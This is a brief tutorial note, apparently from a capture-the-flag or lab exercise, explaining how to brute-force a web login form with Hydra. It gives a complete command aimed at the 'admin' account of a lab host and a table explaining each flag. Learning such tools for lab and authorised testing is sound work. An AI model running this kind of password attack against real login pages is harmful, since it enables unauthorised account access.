# Hydra – Login Brute Forcing

Hydra can brute-force login forms (among many other services) using a password list.

## Command

```bash
hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

## Flag Breakdown

| Flag | Meaning |
|---|---|
| `-l admin` | Single username to try (`admin`) |
| `-P passlist.txt` | Path to the password wordlist |
| `www.onlineshop.thm` | Target host |
| `http-post-form` | Module: brute-force an HTTP POST login form |
| `"/login:username=^USER^&password=^PASS^:F=incorrect"` | Form path + field mapping, where `^USER^`/`^PASS^` are substituted, and `F=incorrect` is the string indicating a **failed** login attempt |
| `-V` | Verbose mode — shows each login attempt |
